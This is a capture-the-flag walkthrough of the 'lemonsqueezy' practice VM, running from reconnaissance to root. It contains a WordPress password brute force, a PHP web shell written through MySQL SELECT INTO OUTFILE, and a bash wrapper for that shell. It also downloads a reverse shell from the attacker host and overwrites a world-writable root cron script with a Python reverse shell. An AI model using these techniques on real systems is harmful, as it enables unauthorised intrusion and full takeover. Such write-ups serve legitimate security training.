
# Description

This is a beginner boot2root in a similar style to ones I personally enjoy like Mr Robot, Lazysysadmin and MERCY.

This is a VMware machine. DHCP is enabled, add lemonsqueezy to your hosts. It’s easypeasy!

# Keywords

worpress, mysql select into outfile, crontab

# nmap

```console
$ sudo nmap -sT -A -Pn -n -p- 172.16.227.130
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 07:04 CEST
Nmap scan report for 172.16.227.130
Host is up (0.00062s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:E2:78:CF (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 172.16.227.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds

```

# scan web service

```console

$ dirb http://172.16.227.130

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 16 07:11:20 2021
URL_BASE: http://172.16.227.130/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.227.130/ ----
+ http://172.16.227.130/index.html (CODE:200|SIZE:10701)                                  
==> DIRECTORY: http://172.16.227.130/javascript/                                          
==> DIRECTORY: http://172.16.227.130/manual/                                              
==> DIRECTORY: http://172.16.227.130/phpmyadmin/                                          
+ http://172.16.227.130/server-status (CODE:403|SIZE:279)                                 
==> DIRECTORY: http://172.16.227.130/wordpress/ 
...
```
## wpscan

```console

$ wpscan  --url http://lemonsqueezy/wordpress/  -P /usr/share/wordlists/rockyou.txt  
...
[!] Valid Combinations Found:
 | Username: orange, Password: ginger
...
```
    
    Found password at http://lemonsqueezy/wordpress/wp-admin/post.php?post=5&action=edit

    n0t1n@w0rdl1st!


## inject code


```console

SELECT "<?php phpinfo(); ?>"  into outfile "/var/www/html/info.php"
SELECT "<?php phpinfo(); ?>"  into outfile "/var/www/html/wordpress/info.php"
SELECT "<?php system($_GET['cmd']); ?>"  into outfile "/var/www/html/wordpress/shell.php"
```

# Get shell

```console
curl http://172.16.227.130/wordpress/shell.php?cmd=id

```

## exploit code

```bash

# $ cat exploit.sh

#!/bin/bash

HOST=lemonsqueezy
SHELL=wordpress/shell.php

printf "$ "
while read line
do
    if [[ "$line" == "exit" ]]; then
        break
    fi
   
    curl -s -G --data-urlencode "cmd=$line" http://$HOST/$SHELL
    
    printf "$ "
done < "/proc/${$}/fd/0"
```

## upload php shell

```console
$ cat /var/www/user.txt
TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


./exploit.sh
$ cat /var/www/user.txt
TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH
└─$ echo TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH | base64 -d
Music can change your life, base64: invalid input

touch > /var/www/html/wordpress/test

wget http://172.16.227.1:8888/php-reverse-shell.php -O /var/www/html/wordpress/php-reverse-shell.php
```

## get PHP shell

```console
$ curl http://172.16.227.130/wordpress/php-reverse-shell.php
```


```console
$ nc -nlvp 1234                         
listening on [any] 1234 ...
connect to [172.16.227.1] from (UNKNOWN) [172.16.227.130] 41932
Linux lemonsqueezy 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 GNU/Linux
 18:07:20 up  3:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Dig server

```console

$ cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    /etc/logrotate.d/logrotate


$ ls -al /etc/logrotate.d/logrotate
-rwxrwxrwx 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate

```

## /etc/logrotate.d/logrotate file

```python

#!/usr/bin/env python
import os
import sys
try:
   os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

# Get root

```console

echo '#!/usr/bin/env python' >/etc/logrotate.d/logrotate
echo 'import socket,subprocess,os' >>/etc/logrotate.d/logrotate
echo 'host="172.16.227.1"' >>/etc/logrotate.d/logrotate
echo 'port=4444' >>/etc/logrotate.d/logrotate
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >>/etc/logrotate.d/logrotate
echo 's.connect((host,port))' >>/etc/logrotate.d/logrotate
echo 'os.dup2(s.fileno(),0)' >>/etc/logrotate.d/logrotate
echo 'os.dup2(s.fileno(),1)' >>/etc/logrotate.d/logrotate
echo 'os.dup2(s.fileno(),2)' >>/etc/logrotate.d/logrotate
echo 'p=subprocess.call("/bin/bash")' >>/etc/logrotate.d/logrotate
```
```console
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.227.1] from (UNKNOWN) [172.16.227.130] 39720
id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty; pty.spawn('/bin/bash')"
root@lemonsqueezy:~# ls -al /root
ls -al /root
total 44
drwx------  6 root root 4096 Apr 26  2020 .
drwxr-xr-x 23 root root 4096 Apr 13  2020 ..
-rw-------  1 root root 2761 Apr 26  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 Apr 13  2020 .cache
drwx------  4 root root 4096 Apr 13  2020 .config
drwxr-xr-x  3 root root 4096 Apr 13  2020 .local
-rw-------  1 root root  699 Apr 13  2020 .mysql_history
drwxr-xr-x  2 root root 4096 Apr 26  2020 .nano
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-r--r--  1 root root   39 Apr 26  2020 root.txt
root@lemonsqueezy:~# cat /root/root.txt
cat /root/root.txt
NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
```